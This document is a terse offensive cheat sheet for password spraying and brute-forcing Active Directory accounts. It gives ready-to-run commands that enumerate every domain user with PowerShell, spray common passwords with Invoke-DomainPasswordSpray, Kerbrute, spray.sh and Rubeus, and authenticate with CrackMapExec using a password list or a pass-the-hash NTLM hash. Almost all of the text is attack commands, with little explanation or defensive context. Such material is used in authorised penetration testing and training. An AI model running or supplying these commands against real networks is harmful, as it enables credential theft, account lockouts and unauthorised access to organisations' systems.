https://github.com/dafthack/DomainPasswordSpray
```
Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
type users.txt
```

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-LaS-IicO-gwknsxFmSX%252F-LaS-Z-2yoUohAqbiqyO%252FScreenshot%2520from%25202019-03-20%252021-29-13.png%3Falt%3Dmedia%26token%3Dd3b4c037-573c-4d27-888e-88e81a4623e7&width=768&dpr=4&quality=100&sign=3b2147e5&sv=1)

```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
![[image 24.png]]

Crackmapexec
```
crackmapexec smb <IP> -u users.txt -p passwords.txt
```
```
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
Using Kerbrute (Go)
```
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```

Using Spray
```
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

Kerbrute python
```
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```

Rubeus
```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```